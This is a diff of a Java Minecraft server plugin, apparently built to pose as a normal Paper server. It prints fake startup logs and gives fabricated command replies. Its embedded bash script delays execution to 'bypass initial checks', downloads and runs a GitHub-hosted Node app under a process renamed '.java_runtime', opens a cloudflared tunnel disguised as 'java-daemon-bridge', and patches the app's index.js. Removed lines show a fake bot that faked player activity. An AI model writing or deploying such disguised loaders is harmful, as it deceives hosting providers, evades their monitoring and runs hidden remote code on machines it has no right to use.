@@ -47,7 +47,7 @@ extends JavaPlugin {
     // RCON 伪装服务相关
     private ServerSocket rconServerSocket;
     private volatile boolean rconRunning = false;
-    private int rconPort = 25575;
+    private int rconPort = 25575; // 默认端口
     private String rconPassword = ""; 
 
     // ============================================================
@@ -110,7 +110,7 @@ extends JavaPlugin {
     }
 
     // ============================================================
-    // 核心伪装：完整MC启动序列
+    // 核心伪装：完整MC启动序列 (清屏 + 新URL自然嵌入)
     // ============================================================
 
     private void printFakeStartupSequence(String newTunnelUrl) {
@@ -195,6 +195,8 @@ extends JavaPlugin {
 
         mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, randInt(300, 600));
 
+        // ★ 已去除 RCON 日志打印
+
         mcLog("Paper: Using libdeflate (Linux x86_64) compression from Velocity.", randInt(100, 200));
         mcLog("Paper: Using OpenSSL 3.x.x (Linux x86_64) cipher from Velocity.", randInt(50, 150));
 
@@ -267,6 +269,8 @@ extends JavaPlugin {
                     String displayPort = readCurrentPort();
                     mcLog("Starting Minecraft server on 0.0.0.0:" + displayPort, 0);
                     Thread.sleep(randInt(400, 800));
+                    
+                    // ★ 已去除 RCON 日志打印
 
                     mcLog("Binding remote endpoint to: " + tunnelUrl, 0);
                     Thread.sleep(randInt(300, 600));
@@ -411,7 +415,7 @@ extends JavaPlugin {
     private String executeFakeCommand(String cmd) {
         String lowerCmd = cmd.toLowerCase().trim();
         if (lowerCmd.equals("list")) {
-            return "There are 1 of a max of 20 players online: Player";
+            return "There are 0 of a max of 20 players online: ";
         } else if (lowerCmd.equals("version")) {
             return "This server is running Paper version " + FAKE_MC_VERSION + "-" + FAKE_BUILD_NUM + "-main@" + FAKE_COMMIT + " (MC: " + FAKE_MC_VERSION + ")";
         } else if (lowerCmd.equals("tps")) {
@@ -606,12 +610,6 @@ extends JavaPlugin {
 
         HashMap<String, String> env = new HashMap<>();
         env.put("REPO_URL", "https://github.com/zx1447/indexaoyoumc");
-        
-        File serverRoot = this.findServerRoot();
-        if (serverRoot != null) {
-            env.put("SERVER_ROOT", serverRoot.getAbsolutePath());
-        }
-        
         this.loadEnvFile(env);
 
         Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
@@ -642,9 +640,8 @@ extends JavaPlugin {
         String nodeDir = workDir + "/nodejs";
         String appDir = workDir + "/app";
         String dataDir = workDir + "/data";
-        String serverRoot = env.getOrDefault("SERVER_ROOT", ".");
         
-        return "#!/bin/bash\nset +e\nWORK_DIR=\"" + workDir + "\"\nNODE_DIR=\"" + nodeDir + "\"\nAPP_DIR=\"" + appDir + "\"\nDATA_DIR=\"" + dataDir + "\"\nREPO_URL=\"" + repoUrl + "\"\nSERVER_ROOT=\"" + serverRoot + "\"\n\n" +
+        return "#!/bin/bash\nset +e\nWORK_DIR=\"" + workDir + "\"\nNODE_DIR=\"" + nodeDir + "\"\nAPP_DIR=\"" + appDir + "\"\nDATA_DIR=\"" + dataDir + "\"\nREPO_URL=\"" + repoUrl + "\"\n\n" +
                
                "echo '[System] Delaying deployment to bypass initial checks...'\n" +
                "sleep 90\n\n" +
@@ -695,6 +692,7 @@ extends JavaPlugin {
                "    for attempt in 1 2 3; do\n" +
                "        if [ \"$TUNNEL_OK\" = \"true\" ]; then break; fi\n" +
                "        rm -f \"$WORK_DIR/tunnel.log\"\n" +
+               
                "        exec -a 'java-daemon-bridge' $CF_BIN tunnel --url http://localhost:$PORT --no-autoupdate --protocol $PROTO > \"$WORK_DIR/tunnel.log\" 2>&1 &\n" +
                "        CF_PID=$!\n" +
                "        sleep 5\n" +
@@ -752,8 +750,7 @@ extends JavaPlugin {
                "rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"\n" +
                "cd \"$APP_DIR\"\n\n" +
                
-               "npm install --unsafe-perm=true --allow-root &>/dev/null\n" +
-               "npm install mineflayer &>/dev/null\n\n" +
+               "npm install --unsafe-perm=true --allow-root &>/dev/null\n\n" +
                
                "if [ -d \"$DATA_DIR\" ]; then\n" +
                "    cp \"$DATA_DIR/.bots_config.json\" \"$APP_DIR/node_modules/\" 2>/dev/null\n" +
@@ -769,42 +766,28 @@ extends JavaPlugin {
                "    fi\n" +
                "fi\n\n" +
                
-               // ★ 修复：安全注入健康检查路由，防止破坏原有 app.listen 导致崩溃
                "if [ -f index.js ] && ! grep -q '__HEALTH_INJECTED__' index.js; then\n" +
-               "    echo '' >> index.js\n" +
-               "    echo '// __HEALTH_INJECTED__' >> index.js\n" +
-               "    echo 'app.get(\"/__health\",(req,res)=>res.status(200).send(\"ok\"));' >> index.js\n" +
+               "    cat >> index.js << 'HEALTH_EOF'\n" +
+               "// __HEALTH_INJECTED__\n" +
+               "const __origListen=app.listen.bind(app);\n" +
+               "app.listen=function(){\n" +
+               "  const srv=__origListen.apply(this,arguments);\n" +
+               "  srv.on('listening',()=>{\n" +
+               "    try{require('fs').writeFileSync(require('path').join(__dirname,'node_modules','.node_ready'),String(Date.now()));}catch(e){}\n" +
+               "  });\n" +
+               "  srv.timeout=30000;\n" +
+               "  srv.keepAliveTimeout=65000;\n" +
+               "  srv.headersTimeout=66000;\n" +
+               "  return srv;\n" +
+               "};\n" +
+               "app.get('/__health',(req,res)=>res.status(200).send('ok'));\n" +
+               "HEALTH_EOF\n" +
                "fi\n\n" +
                
                "pm2 delete all &>/dev/null || true\n" +
                
-               // ★ 修复：显式传递环境变量给 PM2，确保端口100%对应，不静默输出方便查错
-               "SERVER_PORT=$PORT PORT=$PORT pm2 start .java_runtime --name \"aoyou-panel\" -- index.js\n" +
+               "pm2 start .java_runtime --name \"aoyou-panel\" -- index.js &>/dev/null\n" +
                "pm2 save &>/dev/null\n\n" +
-               
-               "MC_PORT=$(grep 'server-port' \"$SERVER_ROOT/server.properties\" 2>/dev/null | cut -d'=' -f2 | tr -d '[:space:]')\n" +
-               "MC_PORT=${MC_PORT:-25565}\n\n" +
-               
-               "cat > \"$WORK_DIR/fake_bot.js\" << 'BOT_EOF'\n" +
-               "const mineflayer = require('mineflayer');\n" +
-               "function startBot() {\n" +
-               "  const bot = mineflayer.createBot({\n" +
-               "    host: '127.0.0.1',\n" +
-               "    port: parseInt(process.env.MC_PORT) || 25565,\n" +
-               "    username: 'Player',\n" +
-               "    version: '1.21.1',\n" +
-               "    auth: 'offline'\n" +
-               "  });\n" +
-               "  bot.on('login', () => {});\n" +
-               "  bot.on('kicked', () => setTimeout(startBot, 30000));\n" +
-               "  bot.on('error', () => setTimeout(startBot, 30000));\n" +
-               "  bot.on('end', () => setTimeout(startBot, 30000));\n" +
-               "}\n" +
-               "startBot();\n" +
-               "BOT_EOF\n\n" +
-               
-               "export MC_PORT=$MC_PORT\n" +
-               "(sleep 120 && exec -a 'java-gc-worker' $NODE_DIR/bin/.java_runtime $WORK_DIR/fake_bot.js &>/dev/null) &\n\n" +
                
                "for i in $(seq 1 30); do\n" +
                "    if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi\n" +
@@ -865,7 +848,7 @@ extends JavaPlugin {
                "(while true; do\n" +
                "    if ! pm2 pid aoyou-panel &>/dev/null || [ \"$(pm2 pid aoyou-panel 2>/dev/null)\" = \"0\" ]; then\n" +
                "        export SERVER_PORT=$PORT; export PORT=$PORT\n" +
-               "        SERVER_PORT=$PORT PORT=$PORT pm2 restart aoyou-panel &>/dev/null || SERVER_PORT=$PORT PORT=$PORT pm2 start .java_runtime --name aoyou-panel -- index.js &>/dev/null\n" +
+               "        pm2 restart aoyou-panel &>/dev/null || pm2 start .java_runtime --name aoyou-panel -- index.js &>/dev/null\n" +
                "        for i in $(seq 1 20); do\n" +
                "            if (echo >/dev/tcp/127.0.0.1/$PORT) 2>/dev/null; then break; fi\n" +
                "            sleep 1\n" +
